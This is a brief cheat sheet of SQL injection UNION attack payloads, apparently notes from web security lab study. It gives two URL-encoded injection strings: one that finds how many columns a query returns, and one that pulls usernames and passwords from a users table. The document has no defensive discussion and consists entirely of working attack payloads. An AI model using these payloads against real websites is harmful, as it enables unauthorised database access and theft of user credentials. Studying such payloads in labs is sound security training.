# UNION attacks

Determine number of columns:

```sql
'+UNION+SELECT+'abc','def'--
```

* example is for 2 columns

Retrieve contents of `users` table:

```sql
'+UNION+SELECT+username,+password+FROM+users--
```







